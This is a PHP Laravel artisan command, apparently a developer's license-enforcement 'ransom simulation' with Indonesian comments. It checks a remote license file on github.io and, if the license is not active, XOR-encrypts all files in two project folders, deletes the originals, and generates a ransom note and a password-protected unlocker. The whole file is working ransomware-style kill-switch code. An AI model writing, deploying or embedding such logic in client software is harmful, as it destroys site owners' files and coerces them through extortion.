<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\File;

class EncryptFiles extends Command
{
    protected $signature = 'ransom:encrypt';
    protected $description = 'Encrypt critical files if license expired → .sd';

    protected $targets = [
        'public/argon',
        'resources/views/livewire/peserta',
    ];

    // GANTI SESUKA HATI — password tebusan
    private $password = 'cat2025rahasia';

    // Kunci enkripsi (panjang banget biar aman)
    private $xorKey = 'AgungSanzCatRansom2025KerenBangetBroGuePunyaIlmuRansomSimulasiCyberSecTeam';

    public function handle()
    {
        $this->info('Mengecek lisensi dari GitHub...');

        try {
            $response = Http::timeout(10)->get('https://agungsapp.github.io/apiAgungLisensi/lisensi.json');
            $catLicense = collect($response->json())->firstWhere('code', 'CAT');
        } catch (\Exception $e) {
            $this->warn('Gagal cek lisensi → dianggap masih aktif.');
            return;
        }

        if ($catLicense && ($catLicense['status'] ?? '') === 'sanca') {
            $this->info('Lisensi masih aktif (sanca). Aman bro.');
            return;
        }

        $this->newLine();
        $this->alert('WARNING: LISENSI MATI! MULAI ENKRIPSI SEMUA FILE...');

        $encryptedCount = 0;

        foreach ($this->targets as $dir) {
            if (!is_dir($dir)) {
                $this->warn("Folder tidak ditemukan: $dir");
                continue;
            }

            $files = File::allFiles($dir);
            foreach ($files as $file) {
                $path = $file->getRealPath();

                // Skip kalau sudah .sd
                if ($file->getExtension() === 'sd') continue;

                $content = file_get_contents($path);

                // Enkripsi (sama, tapi lebih rapi)
                $keyRepeated = substr(str_repeat($this->xorKey, ceil(strlen($content) / strlen($this->xorKey))), 0, strlen($content));
                $encrypted = base64_encode($content ^ $keyRepeated);
                $newPath = $path . '.sd';
                file_put_contents($newPath, $encrypted);
                unlink($path);

                $this->line("Encrypted: " . $file->getFilename() . ' → ' . basename($newPath));
                $encryptedCount++;
            }
        }

        // Simpan password & key buat unlocker
        File::put(storage_path('app/.ransom_pass'), $this->password);
        File::put(storage_path('app/.ransom_key'), $this->xorKey);

        $this->generateUnlocker();

        $this->newLine();
        $this->error("SELESAI! $encryptedCount file berhasil dienkripsi jadi .sd");
        $this->info("Untuk membuka kembali:");
        $this->line("   • php artisan unlock cat2025rahasia");
        $this->line("   • atau klik unlock.bat → ketik password");
    }

    private function generateUnlocker()
    {
        $phpScript = <<<PHP
<?php
echo str_repeat("=", 75) . PHP_EOL;
echo "                 CAT-RANSOM SIMULATION v7.0 FINAL                  " . PHP_EOL;
echo "                  FILE ANDA SUDAH TERENKRIPSI .sd                   " . PHP_EOL;
echo str_repeat("=", 75) . PHP_EOL . PHP_EOL;

echo "Masukkan password tebusan: ";
\$input = trim(fgets(STDIN));

if (\$input !== 'cat2025rahasia') {
    echo PHP_EOL . "PASSWORD SALAH! File tetap terkunci selamanya." . PHP_EOL;
    sleep(5);
    exit;
}

echo PHP_EOL . "Password benar! Sedang membuka semua file .sd..." . PHP_EOL . PHP_EOL;

// Baca kunci XOR
\$key = file_get_contents(__DIR__ . '/storage/app/.ransom_key');

\$targets = ['public/argon', 'resources/views/livewire/peserta'];
\$count = 0;

foreach (\$targets as \$dir) {
    foreach (glob(\$dir . '/**/*.sd') as \$file) {
        \$enc = file_get_contents(\$file);
        \$dec = base64_decode(\$enc) ^ str_repeat(\$key, strlen(base64_decode(\$enc)));
        
        \$orig = preg_replace('/\.sd$/', '', \$file);
        file_put_contents(\$orig, \$dec);
        unlink(\$file);
        
        echo "Restored: " . basename(\$orig) . PHP_EOL;
        \$count++;
    }
}

echo PHP_EOL . "SUKSES! \$count file berhasil dikembalikan!" . PHP_EOL;
echo "Terima kasih telah membayar tebusan dalam bentuk ilmu " . PHP_EOL;
sleep(3);
?>
PHP;

        File::put(base_path('unlock.php'), $phpScript);
        File::put(base_path('unlock.bat'), "@echo off\ntitle CAT-RANSOM UNLOCKER\nphp \"%~dp0unlock.php\"\npause");
        File::put(base_path('BAYAR_TEBUSAN_DULU.txt'), "PASSWORD TEBUSAN: cat2025rahasia\n\nFile sudah dienkripsi jadi .sd\nJalankan unlock.bat untuk membuka.");

        $this->info('unlock.php + unlock.bat + BAYAR_TEBUSAN_DULU.txt sudah dibuat!');
    }
}
